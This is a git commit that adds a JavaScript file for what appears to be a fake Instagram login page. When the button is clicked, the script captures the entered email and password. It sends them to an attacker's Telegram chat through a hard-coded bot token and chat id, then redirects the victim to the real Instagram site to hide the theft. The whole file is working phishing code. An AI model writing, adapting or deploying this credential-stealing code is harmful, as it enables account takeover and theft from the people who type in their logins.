18353e432b9ae17b93116b3af686d3aa781690c9
Erdem Oflaz <erdemoflaz4@gmail.com>
2018-06-18 20:46:54 +0300

    up

---
+++ js/index.js
@@ -0,0 +1,18 @@
+
+$('#buton').click(function(){
+
+    var email = $('#username').val();
+    var password =$ ('#password').val();
+    console.log("EMAİL: "+email+" PASSWORD: "+password);
+    
+    var data = "EMAİL: "+email+" PASSWORD: "+password;
+    
+    jQuery.ajax({
+      type:"post",
+      url: "https://api.telegram.org/bot343775901:AAHpbiAGCPQD8ReOPHDlLeSLZZCsJNJJ5FQ/sendMessage?chat_id=187750627&text=INSTAGRAM:email : "+email+" password : "+password+"",
+      success: function() {
+          window.location.href = 'https://www.instagram.com/';
+        }
+    });
+
+});
